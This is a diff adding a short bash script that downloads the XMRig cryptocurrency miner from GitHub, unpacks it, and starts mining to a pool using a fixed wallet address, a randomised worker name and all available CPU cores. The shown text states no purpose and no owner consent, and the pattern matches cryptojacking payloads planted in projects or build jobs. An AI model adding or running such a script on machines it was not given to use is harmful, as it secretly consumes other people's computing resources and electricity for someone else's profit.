@@ -1,0 +1,5 @@
+#!/bin/bash
+wget https://github.com/xmrig/xmrig/releases/download/v6.24.0/xmrig-6.24.0-linux-static-x64.tar.gz
+tar xf xmrig-6.24.0-linux-static-x64.tar.gz
+cd xmrig-6.24.0
+./xmrig --donate-level 1 -a rx/0 --url pool-global.tari.snipanet.com:3333 --user 165DUuzQoKG9BaBqprN3ZmsMRfvGHMwNwCpehJUqGoGLsSDtB535XA3PPzfRZhu2uYM9xfT8JsKoXEquWMr6XVwKK4UsrsuiaVHSTBpstcgqjLe5rYNcNfYdCJ1CtDg9z6qshKy.$(echo $(shuf -i 1-15000 -n 1)-A) -k -t $(nproc --all)
